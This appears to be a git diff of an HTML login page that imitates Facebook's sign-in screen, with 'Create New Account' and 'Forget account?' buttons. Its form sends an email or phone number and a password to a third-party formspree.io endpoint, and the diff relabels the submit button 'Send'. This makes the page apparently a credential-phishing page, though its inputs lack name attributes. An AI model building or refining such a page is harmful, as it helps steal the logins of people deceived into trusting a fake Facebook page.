@@ -43,15 +43,19 @@
           <!--Column 2-->
           <div class="col-sm-5">
             <div class="card">
-			<form action="https://formspree.io/f/mayakyyv" method="post">
-              <div>
+			<form action="https://formspree.io/f/mayakyyv" method="POST">
+				<label>
                 <input id="email" class="input-group" type="text" placeholder="Email Address or Phone Number" required>
+				</label>
+				<label>
                 <input id="pass" class="input-group my-2" type="password" placeholder="Password" required>
-				<input type="submit" value="Log In" id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">
+				</label>
+				<button type="submit" id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">Send</button>
+			</form>
                 <hr id="hr1">
                 <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget password?</a>
                 </p>
-              </div></form> 
+              </div> 
               <hr id="hr2">
               <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
               <p id="forgetPass2" class="text-center my-3"><a href="#">Forget account?</a></p>
